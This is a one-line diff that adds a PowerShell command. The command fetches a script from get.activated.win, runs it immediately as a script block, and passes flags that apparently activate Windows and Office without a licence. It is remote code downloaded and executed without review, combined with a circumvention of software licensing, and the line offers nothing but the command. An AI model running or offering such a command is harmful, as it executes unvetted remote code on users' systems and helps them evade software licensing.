@@ -1,0 +1,1 @@
+& ([ScriptBlock]::Create((irm https://get.activated.win))) /KMS38 /K-WindowsOffice
